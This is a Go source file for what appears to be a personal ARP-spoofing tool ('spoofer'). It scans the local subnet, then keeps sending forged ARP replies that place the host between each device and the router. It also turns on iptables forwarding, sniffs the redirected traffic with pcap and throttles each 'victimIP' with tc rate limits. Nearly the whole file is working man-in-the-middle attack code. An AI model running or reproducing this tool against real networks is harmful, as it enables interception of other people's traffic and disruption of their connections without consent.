package engine

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"crypto/sha256"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"
	"github.com/gopacket/gopacket/pcap"

	"github.com/miekg/dns"
)

// TODO:
// 1. gracefull shutdowns
// 2. make logs
// 3. persistant data
// 4. windows port

func GetDevices() {
	fmt.Println("GetDevices")
}

type Mask struct {
	MaskIP net.IP     `json:"maskIp"`
	Mask   net.IPMask `json:"mask"`
}

type Device struct {
	Name          string    `json:"name"`
	IP            net.IP    `json:"ip"`
	MAC           []byte    `json:"mac"`
	Interface     string    `json:"interface"`
	Reachable     bool      `json:"reachable"`
	Mask          Mask      `json:"mask"`
	lastMeasure   time.Time `json:"-"`
	BytesSent     int64     `json:"bytesSent"`
	BytesReceived int64     `json:"bytesReceived"`
	prevBytesSent int64     `json:"-"`
	prevBytesRecv int64     `json:"-"`
	UpRate        float64   `json:"upRate"`
	DownRate      float64   `json:"downRate"`
	UpClass       string    `json:"upClass"`
	DownClass     string    `json:"downClass"`
	Blocked       bool      `json:"blocked"`
}

type DeviceMap struct {
	Devices map[string]*Device
	mu      *sync.RWMutex
}

// look into this
func (d *Device) tick() {
	now := time.Now()
	elapsed := now.Sub(d.lastMeasure).Seconds()
	if elapsed < 0.001 {
		return
	}
	d.UpRate = float64(d.BytesSent-d.prevBytesSent) / elapsed
	d.DownRate = float64(d.BytesReceived-d.prevBytesRecv) / elapsed
	d.prevBytesSent = d.BytesSent
	d.prevBytesRecv = d.BytesReceived
	d.lastMeasure = now
}
func (d Device) String() string {
	return fmt.Sprintf("Name: %s, IP: %s, MAC: %s, Interface: %s, Reachable: %t, Mask: %s, UpRate: %.2f, DownRate: %.2f", d.Name,
		d.IP.String(), net.HardwareAddr(d.MAC).String(), d.Interface, d.Reachable, d.Mask.MaskIP.String(), d.UpRate, d.DownRate)
}

type forwardState string

// call this FORWARD like a decent human being
const (
	FORWARD_ACCEPT forwardState = "ACCEPT"
	FORWARD_REJECT forwardState = "REJECT"
	FORWARD_DROP   forwardState = "DROP"
)

func IpTrafficMonitor(devices DeviceMap, host Device, ctx context.Context, errChan chan error) {
	handle, err := pcap.OpenLive(host.Interface, 1600, true, 1000*time.Millisecond)
	if err != nil {
		errChan <- err
		log.Println("Error opening device:", err)
	}
	defer handle.Close()
	err = handle.SetBPFFilter("ip")
	if err != nil {
		errChan <- err
		log.Println("Error setting filter for ip:", err)
	}
	packetSource := gopacket.NewPacketSource(
		handle,
		handle.LinkType(),
	)
	packetsCh := packetSource.PacketsCtx(ctx)
	var n int
	for {
		select {
		case <-ctx.Done():
			return
		case packet := <-packetsCh:
			ipLayer := packet.Layer(layers.LayerTypeIPv4)
			if ipLayer == nil {
				continue
			}
			ip := ipLayer.(*layers.IPv4)
			src := ip.SrcIP
			dst := ip.DstIP
			n++
			if n%100 == 0 {
				fmt.Printf("traffic goroutine: saw %d ip packets\n", n)
				fmt.Printf("sample src=%s dst=%s\n", ip.SrcIP, ip.DstIP)
			}
			devices.mu.Lock()
			for _, d := range devices.Devices {
				if d.IP.Equal(src) {
					d.BytesSent += int64(packet.Metadata().CaptureInfo.Length)
				}
				if d.IP.Equal(dst) {
					d.BytesReceived += int64(packet.Metadata().CaptureInfo.Length)
				}
				d.tick()
			}
			devices.mu.Unlock()
		}
	}
}

type Engine struct {
	Devices DeviceMap
}

func (e *Engine) GetDevices() {
}

// 1. setup rcv loop //listens for replys from the send loop but we set it up first so we don't miss any replys // device chanel
// 2. setup send loop // send arp requests to all available ips on the network
// 3. setup poison loop // send forged replys to spoof
// 4. setup measure loop // measure rate up and down
func Start(e *Engine) {
	host := getHost()
	ds := DeviceMap{
		Devices: make(map[string]*Device),
		mu:      &sync.RWMutex{},
	}
	e.Devices = ds
	handle, err := pcap.OpenLive(host.Interface, 1600, true, 1000*time.Millisecond)
	if err != nil {
		panic("Error opening device: " + err.Error())
	}
	if host.Reachable == false {
		panic("No active interface found")
	}
	defer handle.Close()

	state := getIpTablesForwardState(host.Interface)
	if state != FORWARD_ACCEPT {
		err := setIpTablesForwardState(host.Interface, FORWARD_ACCEPT)
		if err != nil {
			panic(err)
		}
		if getIpTablesForwardState(host.Interface) != FORWARD_ACCEPT {
			panic(fmt.Errorf("iptables forward state is %s and couldn't be set to ACCEPT, Try to change it manually with : sudo iptables -A FORWARD -i %s -j ACCEPT", state, host.Interface))
		}
	}

	tcTeardown(host.Interface)
	err = tcStartUp(host.Interface)
	if err != nil {
		panic(err)
	}

	errChan := make(chan error)
	deviceCh := make(chan *Device)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go ArpRCV(deviceCh, host, handle, ctx, errChan)
	go ArpSendRequests(host, handle, ctx, errChan)
	go ArpSendForgedReplys(ds, host, handle, ctx, errChan)
	go IpTrafficMonitor(ds, host, ctx, errChan)

	for {
		select {
		case <-ctx.Done():
			tcTeardown(host.Interface)
			return
		case err := <-errChan:
			log.Println("Error:", err)
		case device := <-deviceCh:
			ds.mu.Lock()
			getDeviceName(device)
			if _, ok := ds.Devices[createDeviceHash(device)]; !ok {
				ds.Devices[createDeviceHash(device)] = device
			}
			ds.mu.Unlock()

		}
		for _, device := range ds.Devices {
			fmt.Println(device.String())
		}
	}
}

func ArpSendRequests(host Device, handle *pcap.Handle, ctx context.Context, errChan chan error) {
	ip := host.IP.Mask(host.Mask.Mask).To4()

	invertedMask := make(net.IPMask, len(host.Mask.Mask))
	copy(invertedMask, host.Mask.Mask)
	invertedMask[0] = ^invertedMask[0]
	invertedMask[1] = ^invertedMask[1]
	invertedMask[2] = ^invertedMask[2]
	invertedMask[3] = ^invertedMask[3]
	maxSub := make([]byte, len(invertedMask))

	for i := range invertedMask {
		maxSub[i] = invertedMask[i] | host.IP[i]
	}

	fmt.Printf("Max Subnet: %s\n", net.IP(maxSub).String())
	fmt.Printf("IP: %s\n", ip.String())
	fmt.Println("interfa", host.Interface)
	// send arp packets per ip in subnet
	//
	// TODO: should be done ina goroutine with a 5s ticker
	tk := time.NewTicker(time.Second * 5)
	for {
		select {
		case <-ctx.Done():
			return
		case <-tk.C:
			for {
				if ip.Equal(net.IP(maxSub)) {
					break
				}

				err := arpSendOperation(
					net.HardwareAddr(host.MAC),
					net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
					host.MAC,
					net.HardwareAddr{0, 0, 0, 0, 0, 0},
					host.IP,
					ip.To4(),
					layers.ARPRequest,
					handle,
				)
				// TODO: buld a log
				if err != nil {
					log.Println("Error sending packet:", err)
				}

				incrementIP(ip)
			}
		}
	}
}

func ArpSendForgedReplys(devices DeviceMap, host Device, handle *pcap.Handle, ctx context.Context, errChan chan error) {
	ticker := time.NewTicker(time.Second * 2)
	defer ticker.Stop()

	routerIP := net.ParseIP("192.168.1.1") // TODO: get tis from the network
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			// the two loops above
			var router *Device
			devices.mu.RLock()
			for _, device := range devices.Devices {
				if device.IP.Equal(routerIP) {
					router = device
				}
				if device.IP.Equal(host.IP) || device.IP.Equal(routerIP) {
					continue

				}
				err := arpSendOperation(
					net.HardwareAddr(host.MAC),
					net.HardwareAddr(device.MAC),
					host.MAC,
					device.MAC,
					routerIP.To4(),
					device.IP.To4(),
					layers.ARPReply,
					handle,
				)
				if err != nil {
					errChan <- err
					log.Println("Error sending reply:", err)
				}

				if router != nil {
					err = arpSendOperation(
						net.HardwareAddr(host.MAC),
						net.HardwareAddr(router.MAC),
						host.MAC,
						router.MAC,
						device.IP.To4(),
						router.IP.To4(),
						layers.ARPReply,
						handle,
					)
					if err != nil {
						errChan <- err
						log.Println("Error sending reply:", err)
					}
				}
			}
			devices.mu.RUnlock()
		}
	}

}

// rcv goroutine
func ArpRCV(deviceCh chan *Device, host Device, handle *pcap.Handle, ctx context.Context, errChan chan error) {
	packetSource := gopacket.NewPacketSource(
		handle,
		handle.LinkType(),
	)
	packetsCh := packetSource.PacketsCtx(ctx)

	for {
		for packet := range packetsCh {
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil {
				continue
			}
			arp := arpLayer.(*layers.ARP)
			device := &Device{
				IP:        net.IP(arp.SourceProtAddress),
				MAC:       net.HardwareAddr(arp.SourceHwAddress),
				Reachable: true,
				Mask: Mask{
					MaskIP: host.Mask.MaskIP,
					Mask:   host.Mask.Mask,
				},
			}

			deviceCh <- device
			// TODO: remove this
			fmt.Printf(
				"ARP: %s (%s) -> %s (%s), op=%d\n",
				device.IP.String(),
				net.HardwareAddr(device.MAC).String(),
				net.IP(arp.DstProtAddress).String(),
				net.HardwareAddr(arp.DstHwAddress).String(),
				arp.Operation,
			)
		}
		select {
		case <-ctx.Done():
			return
		}
	}
}

func getVendor(mac net.HardwareAddr) string {
	prefix := strings.ToUpper(strings.ReplaceAll(mac.String(), ":", ""))[:6]

	f, err := os.Open("/home/saif/Dev/personal-projects/GolangPrrrr/spoofer/data/ieee-oui.txt") // FIX: don't hard code this
	if err != nil {
		return "Unknown"
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)

	for scanner.Scan() {
		line := scanner.Text()

		if strings.HasPrefix(strings.ToUpper(line), prefix) {
			parts := strings.Fields(line)

			if len(parts) >= 2 {
				return strings.Join(parts[1:], " ")
			}
		}
	}

	return ""
}

func getDeviceName(d *Device) {
	ip := d.IP.String()
	names, err := net.LookupAddr(ip)
	if err == nil && len(names) > 0 {
		d.Name = strings.TrimSuffix(names[0], ".")
		return
	}
	name := getVendor(net.HardwareAddr(d.MAC))
	if name != "" {
		d.Name = name
		return
	}
	// TODO: start a goroutine to resolve the name with mdns, llmnr ..etc, and listen for changes later
	// if name, err := reverseMDN(ip); err == nil {
	// 	d.Name = name
	// 	return
	// }
	d.Name = "Unknown"
}

func reverseMDNS(ip string) (string, error) {
	addr := net.ParseIP(ip).To4()
	if addr == nil {
		return "", fmt.Errorf("invalid IPv4: %s", ip)
	}
	q := fmt.Sprintf("%d.%d.%d.%d.in-addr.arpa.", addr[3], addr[2], addr[1], addr[0])

	msg := new(dns.Msg)
	msg.SetQuestion(q, dns.TypePTR)
	msg.RecursionDesired = false
	b, err := msg.Pack()
	if err != nil {
		return "", err
	}

	pc, err := net.ListenPacket("udp4", ":0") // unconnected, non-5353 port
	if err != nil {
		return "", err
	}
	defer pc.Close()

	for _, dst := range []string{ip + ":5353", "224.0.0.251:5353"} {
		if ua, err := net.ResolveUDPAddr("udp4", dst); err == nil {
			pc.WriteTo(b, ua)
		}
	}

	pc.SetReadDeadline(time.Now().Add(2 * time.Second))
	buf := make([]byte, 1500)
	for {
		n, _, err := pc.ReadFrom(buf)
		if err != nil {
			return "", err
		}
		var resp dns.Msg
		if resp.Unpack(buf[:n]) != nil {
			continue
		}
		for _, rr := range resp.Answer {
			if ptr, ok := rr.(*dns.PTR); ok && strings.EqualFold(ptr.Hdr.Name, q) {
				return strings.TrimSuffix(ptr.Ptr, "."), nil
			}
		}
	}
}

func createDeviceHash(d *Device) string {
	hash := sha256.New()
	_, err := hash.Write([]byte(d.IP.String()))
	if err != nil {
		fmt.Println("Error creating hash:", err)
		return ""
	}
	_, err = hash.Write([]byte(net.HardwareAddr(d.MAC).String()))
	if err != nil {
		fmt.Println("Error creating hash:", err)
		return ""
	}
	return fmt.Sprintf("%x", hash.Sum(nil))
}

func incrementIP(ip net.IP) {
	for i := len(ip) - 1; i >= 0; i-- {
		ip[i]++
		if ip[i] > 0 {
			break
		}
	}
}

// A warapper used to build arp packets for both req and reply
// see https://github.com/google/gopacket/blob/master/layers/arp.go
func arpSendOperation(srcMac, dstMac, srcHwAddr, dstHwAddr net.HardwareAddr,
	srcIp, dstIp net.IP,
	arpOpType uint16,
	handle *pcap.Handle) error {
	ethLayer := &layers.Ethernet{
		SrcMAC:       srcMac,
		DstMAC:       dstMac,
		EthernetType: layers.EthernetTypeARP,
	}

	arpLayer := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         arpOpType,
		SourceHwAddress:   srcHwAddr,
		SourceProtAddress: srcIp.To4(),
		DstHwAddress:      dstHwAddr,
		DstProtAddress:    dstIp.To4(),
	}

	var err error
	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	err = gopacket.SerializeLayers(buffer, options, ethLayer, arpLayer)
	if err != nil {
		return err
	}
	outboundPacket := buffer.Bytes()
	err = handle.WritePacketData(outboundPacket)
	if err != nil {
		return err
	}
	return err
}

func tcCommand(args ...string) error {
	var err error
	cmd := exec.Command("tc", args...)
	err = cmd.Run()
	return err
}

func tcDeleteFilter(iface, filterHandle, side, ip string) error {
	return tcCommand(
		"filter", "del", "dev", iface, "protocol",
		"ip", "parent", "1:", "prio", "1",
		"handle", filterHandle, "u32", "match", "ip", side, ip+"/32",
	)
}
func tcChangeUpRate(iface, ip, upRate, upClass string) error {
	err := tcDeleteFilter(iface, "800::"+strings.TrimPrefix(upClass, "1:"), "src", ip)
	if err != nil {
		return err
	}
	return tcAddUpload(iface, ip, upRate, upClass)
}
func tcChangeDownRate(iface, ip, downRate, downClass string) error {
	err := tcDeleteFilter(iface, "800::"+strings.TrimPrefix(downClass, "1:"), "dst", ip)
	if err != nil {
		return err
	}
	return tcAddDownload(iface, ip, downRate, downClass)
}
func tcAddUpload(iface, victimIP, upRate, upClass string) error {
	err := tcCommand(
		"class", "replace",
		"dev", iface,
		"parent", "1:",
		"classid", upClass,
		"htb", "rate", upRate, "ceil", upRate,
	)
	if err != nil {
		return err
	}

	return tcCommand(
		"filter", "add",
		"dev", iface,
		"protocol", "ip",
		"parent", "1:",
		"prio", "1",
		"handle", "800::"+strings.TrimPrefix(upClass, "1:"),
		"u32", "match", "ip", "src", victimIP+"/32",
		"flowid", upClass,
	)
}

func tcAddDownload(iface, victimIP, downRate, downClass string) error {
	err := tcCommand(
		"class", "replace",
		"dev", iface,
		"parent", "1:",
		"classid", downClass,
		"htb", "rate", downRate, "ceil", downRate,
	)
	if err != nil {
		return err
	}

	return tcCommand(
		"filter", "add",
		"dev", iface,
		"protocol", "ip",
		"parent", "1:",
		"prio", "1",
		"handle", "800::"+strings.TrimPrefix(downClass, "1:"),
		"u32", "match", "ip", "dst", victimIP+"/32",
		"flowid", downClass,
	)
}

func tcTeardown(iface string) {
	err := tcCommand("qdisc", "del", "dev", iface, "root")
	if err != nil {
		fmt.Println("Error deleting tc qdisc:", err)
	}
}

func tcStartUp(iface string) error {
	err := tcCommand(
		"qdisc", "replace", "dev", iface, "root",
		"handle", "1:",
		"htb", "default", "9999",
	)
	if err != nil {
		return err
	}

	err = tcCommand(
		"class", "replace",
		"dev", iface,
		"parent", "1:",
		"classid", "1:9999",
		"htb", "rate", "1gbit", "ceil", "1gbit",
	)
	return err
}

func setIpTablesForwardState(iface string, state forwardState) error {
	cmd := exec.Command("iptables", "-A", "FORWARD", "-i", iface, "-j", string(state))
	_, err := cmd.Output()
	if err != nil {
		return err
	}
	return nil
}

func getIpTablesForwardState(iface string) forwardState {
	var state forwardState
	cmd := exec.Command("iptables", "-S", "FORWARD")
	out, err := cmd.Output()
	if err != nil {
		fmt.Println("Error getting iptables state:", err)
	}
	scanner := bufio.NewScanner(bytes.NewReader(out))
	var policyState forwardState
	var iFaceState forwardState
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Fields(line)
		if parts[0] == "-P" {
			state = forwardState(parts[2])
			switch state {
			case FORWARD_ACCEPT:
				policyState = FORWARD_ACCEPT
			case FORWARD_REJECT:
				policyState = FORWARD_REJECT
			case FORWARD_DROP:
				policyState = FORWARD_DROP
			}
		}
		if strings.Contains(line, iface) {
			last := parts[len(parts)-1]
			switch last {
			case "ACCEPT":
				iFaceState = FORWARD_ACCEPT
			case "REJECT":
				iFaceState = FORWARD_REJECT
			case "DROP":
				iFaceState = FORWARD_DROP
			}
		}
	}

	if policyState == FORWARD_ACCEPT {
		state = FORWARD_ACCEPT
		fmt.Println("iptables forward policy is ACCEPT")
	}
	if iFaceState == FORWARD_ACCEPT {
		state = FORWARD_ACCEPT
		fmt.Println("iptables forward interface is ACCEPT")
	}

	fmt.Println("iptables forward state is", state)
	return state
}

func getHost() Device {
	host := Device{}
	hostname, _ := os.Hostname()
	host.Name = hostname

	// Dial a UDP address to find the active outbound IP.
	// This does not actually send any network packets or require an internet connection.
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		fmt.Println("Error identifying active interface:", err)
		return host
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	activeIP := localAddr.IP

	interfaces, err := net.Interfaces()
	if err != nil {
		fmt.Println("Error reading interfaces:", err)
		return host
	}

	for _, iface := range interfaces {
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				host.Mask = Mask{
					MaskIP: net.IP(v.Mask),
					Mask:   v.Mask,
				}
				ip = v.IP.To4()
			case *net.IPAddr:
				ip = v.IP.To4()
			}

			if ip != nil && ip.Equal(activeIP) {
				host.Interface = iface.Name
				host.Reachable = true
				host.IP = ip.To4()
				if iface.HardwareAddr.String() != "" {
					host.MAC = iface.HardwareAddr
				}
			}
		}
	}
	return host
}

// func initMDNS() *mdns.Server {
// 	// Setup our service export
// 	host, _ := os.Hostname()
// 	info := []string{"Hostname discovery service"}
// 	service, _ := mdns.NewMDNSService(host, "_Hostname_discovery_service._tcp", "", "", 5353, nil, info)
//
// 	// Create the mDNS server, defer shutdown
// 	server, _ := mdns.NewServer(&mdns.Config{Zone: service})
// 	return server
// }

// func parseARPTable() (map[string]string, error) {
// 	devices := make(map[string]string, 10)
// 	f, err := os.Open("/proc/net/arp")
// 	if err != nil {
// 		return nil, err
// 	}
// 	defer f.Close()
//
// 	scanner := bufio.NewScanner(f)
// 	var ips []net.IP
//
// 	for scanner.Scan() {
// 		if scanner.Err() != nil {
// 			return nil, scanner.Err()
// 		}
// 		line := scanner.Text()
// 		if strings.HasPrefix(line, "IP address") {
// 			continue
// 		}
//
// 		// FIX: Use strings.Fields instead of strings.Split to handle variable whitespaces
// 		parts := strings.Fields(line)
//
// 		// The Linux ARP table layout always breaks into 6 fields when using Fields()
// 		if len(parts) != 6 {
// 			continue
// 		}
//
// 		// Skip incomplete entries (disconnected devices or stale entries)
// 		if parts[3] == "00:00:00:00:00:00" {
// 			continue
// 		}
//
// 		ip := net.ParseIP(parts[0])
// 		if ip == nil {
// 			fmt.Println("Error parsing IP:", parts[0])
// 			continue
// 		}
//
// 		// parts[3] corresponds to the HW address (MAC) column
// 		fmt.Printf("Found active device -> IP: %s | MAC: %s\n", ip.String(), parts[3])
// 		ips = append(ips, ip)
// 	}
//
// 	for _, dev := range ips {
// 		var hostname string
// 		names, err := net.LookupAddr(dev.String())
// 		fmt.Println(names)
// 		if err == nil && len(names) > 0 {
// 			hostname = strings.TrimSuffix(names[0], ".")
// 		} else {
// 			hostname = "Unknown / Hidden"
// 		}
// 		devices[dev.String()] = hostname
// 	}
//
// 	return devices, nil
// }
